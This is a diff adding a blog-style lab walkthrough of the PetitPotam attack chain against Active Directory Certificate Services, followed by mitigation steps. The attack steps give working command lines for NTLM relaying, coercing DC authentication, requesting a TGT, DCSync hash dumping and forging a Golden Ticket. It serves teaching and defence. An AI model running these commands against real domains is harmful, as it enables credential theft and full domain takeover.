@@ -1,0 +1,150 @@
+<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
+
+<p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>
+
+<ul>
+  <li>The <strong>PetitPotam attack</strong> is a technique where we abuse the <strong>printer bug</strong> (Explained here: https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug) to make a <strong>domain controller</strong> authenticate to our <strong>kali machine</strong>.</li>
+  <li><em>Relaying the captured authentication</em> to the <strong>web interface of AD Certificate services (ADCS)</strong> allows us to get the <strong>certificate of the domain controller’s computer account</strong>.</li>
+  <li><em>Having this certificate</em> can let us <strong>request a TGT for the computer account</strong>.</li>
+  <li><em>And, with a TGT of a Domain Controller’s machine account,</em> we can abuse its <strong>DCSync</strong> right on the domain to retrieve <strong>a full dump containing all domain users’ NTLM hashes</strong>.</li>
+  <li><em>Having all user hashes and using them with a simple Pass-the-Hash attack,</em> we can obtain <strong>code execution as a Domain Admin</strong>.</li>
+  <li><strong>Persistence</strong> can also be established with a <strong>Golden Ticket</strong> since the <code class="language-plaintext highlighter-rouge">krbtgt</code> account hash would be obtainable.</li>
+</ul>
+
+<hr />
+
+<h1 id="tools-needed">Tools needed</h1>
+<ol>
+  <li><strong>Impacket</strong> (https://github.com/SecureAuthCorp/impacket)</li>
+  <li><strong>PetitPotam</strong> (https://github.com/topotam/PetitPotam)</li>
+  <li><strong>Rubeus</strong> (https://github.com/GhostPack/Rubeus)</li>
+  <li><strong>Mimikatz</strong> (https://github.com/gentilkiwi/mimikatz)</li>
+</ol>
+
+<hr />
+
+<h1 id="lab-setup-and-conditions">Lab Setup and Conditions</h1>
+<h2 id="1-dclablocal-192168126129">1. DC.lab.local (192.168.126.129)</h2>
+<p>A Domain Controller with <strong>Active Directory Certificate Services Web Enrollment</strong> enabled</p>
+
+<p><img src="/assets/petitpotam/Domain-Controllers.jpg" alt="Domain-Controllers" /></p>
+
+<p><img src="/assets/petitpotam/AD-CS-Installed.jpg" alt="AD-CS-Installed" /></p>
+
+<h2 id="2-dc2lablocal-192168126130">2. DC2.lab.local (192.168.126.130)</h2>
+<p>Another Domain Controller (<em>PrintSpooler Service must be running to quickly force authentication.</em>)</p>
+
+<p><img src="/assets/petitpotam/Spooler-Running.jpg" alt="Spooler-Running" /></p>
+
+<h2 id="3-kali-machine-192168126132">3. Kali Machine (192.168.126.132)</h2>
+<p>for triggering authentication and relaying to ADCS Web UI.</p>
+
+<p><img src="/assets/petitpotam/kali-ip-config.jpg" alt="kali-ip-config" /></p>
+
+<h2 id="4-windows-machine-192168126128">4. Windows Machine (192.168.126.128)</h2>
+<p>for requesting a TGT and doing the DCSync attack (The machine shouldn’t be in the domain, but should have the Domain Controller set as its primary DNS server).</p>
+
+<p><img src="/assets/petitpotam/Windows-Attacker-ipconfig.jpg" alt="Windows-Attacker-ipconfig" /></p>
+
+<h2 id="5-normal-user-account-labjohnsmith">5. normal user account (Lab\JohnSmith)</h2>
+<p>A regular domain user with no special privileges.</p>
+
+<p><img src="/assets/petitpotam/John-Smith-User.jpg" alt="John-Smith-User" /></p>
+
+<hr />
+
+<h1 id="steps-to-create">Steps to Create</h1>
+<h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
+<p><code class="language-plaintext highlighter-rouge">ntlmrelayx.py -t http://&lt;CA_Server&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></p>
+
+<p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>
+
+<h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
+<p><code class="language-plaintext highlighter-rouge">python3 PetitPotam.py -d &lt;DOMAIN_FQDN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;</code></p>
+
+<p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>
+
+<h2 id="3-recieve-the-base64-certificate-for-the-domain-controllers-computer-account">3. Recieve the Base64 certificate for the domain controller’s computer account</h2>
+
+<p><img src="/assets/petitpotam/got-dc2-cert.jpg" alt="got-dc2-cert" /></p>
+
+<h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>
+
+<p><code class="language-plaintext highlighter-rouge">.\Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;</code></p>
+
+<p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>
+
+<p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>
+
+<h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
+<p><code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;</code></p>
+
+<p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>
+
+<h2 id="6-grab-any-domain-admins-hash-to-have-code-execution">6. Grab any domain admin’s hash to have code execution</h2>
+
+<p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>
+
+<h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
+<p>Domain SID Lookup: <code class="language-plaintext highlighter-rouge">lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;</code></p>
+
+<p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>
+
+<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash: <code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt</code></p>
+
+<p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>
+
+<p>Golden ticket creation: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;DOMAIN_SID&gt; -domain &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;</code></p>
+
+<p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>
+
+<p>Exporting ticket to the environment: <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/&lt;CHOSEN_USERNAME&gt;.ccache</code></p>
+
+<p>Command execution using ticket: <code class="language-plaintext highlighter-rouge">psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; -k -no-pass</code></p>
+
+<p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>
+
+<hr />
+
+<h1 id="mitigation">Mitigation:</h1>
+<h2 id="1-enable-epa-for-certificate-authority-web-enrollment">1. Enable EPA for Certificate Authority Web Enrollment</h2>
+<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</p>
+
+<p><img src="/assets/petitpotam/certsrv-epa-required.jpg" alt="certsrv-epa-required" /></p>
+
+<h2 id="2-enable-epa-for-certificate-enrollment-web-service">2. Enable EPA for Certificate Enrollment Web Service</h2>
+<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; <CA_NAME>\_CES\_Kerberos -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</CA_NAME></p>
+
+<p><img src="/assets/petitpotam/certentrollwebsvc-epa-required.jpg" alt="certentrollwebsvc-epa-required" /></p>
+
+<p>After enabling EPA in the UI, the <code class="language-plaintext highlighter-rouge">Web.config</code> file created by CES role at <code class="language-plaintext highlighter-rouge">&lt;%windir%&gt;\systemdata\CES\&lt;CA Name&gt;_CES_Kerberos\web.config</code> should also be updated by adding <code class="language-plaintext highlighter-rouge">&lt;extendedProtectionPolicy&gt;</code> set with a value of <code class="language-plaintext highlighter-rouge">Always</code></p>
+
+<p><img src="/assets/petitpotam/web-config-editing.jpg" alt="web-config-editing" /></p>
+
+<h2 id="3-enable-require-ssl-which-will-enable-only-https-connections">3. Enable Require SSL, which will enable only HTTPS connections.</h2>
+<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; SSL Settings -&gt; Require SSL</p>
+
+<p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>
+
+<h2 id="4-restart-iis">4. Restart IIS</h2>
+<p><em>From an elevated command prompt,</em> type: <code class="language-plaintext highlighter-rouge">iisreset /restart</code></p>
+
+<hr />
+
+<h1 id="conclusion">Conclusion</h1>
+<p>Having a non-secure AD CS Installation in a domain can present an attacker with an easy way to achieve Domain Admin privileges and gain Persistence.
+Luckily enough, with some simple mitigation steps, this can be resolved.</p>
+
+<hr />
+
+<h1 id="credits">Credits</h1>
+<ol>
+  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)</li>
+  <li><strong>Lionel Gilles</strong> for creating the <strong>PetitPotam</strong> Python Script</li>
+  <li><strong>Yang Zhang</strong> of Back2Zero team &amp; <strong>Yongtao Wang</strong> (@Sanr) of BCM Social Corp, <strong>Eyal Karni, Marina Simakov and Yaron Zinar</strong> from Preempt &amp; <strong>n1nty</strong> from A-TEAM of Legendsec at Qi’anxin Group for the <strong>PrinterBug</strong> (CVE-2019-1040)</li>
+  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts</li>
+  <li><strong>Benjamin Delpy</strong> for the legendary <strong>mimikatz</strong></li>
+  <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
+  <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
+  <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
+</ol>
